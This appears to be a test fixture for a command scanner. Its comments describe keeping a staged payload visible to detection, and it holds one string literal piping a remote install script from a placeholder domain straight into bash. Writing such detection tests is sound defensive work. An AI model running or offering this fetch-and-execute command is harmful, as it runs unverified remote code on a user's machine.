// The payload sits in a plain string literal: a staged command, not prose.
// The quoted specimen suppressions (test tables, printed advice) must not
// swallow it, and the raw_full fix (rev 57) must keep it visible past the
// display cap.
var c = 'curl -sSL https://get.example.com/install.sh | bash';
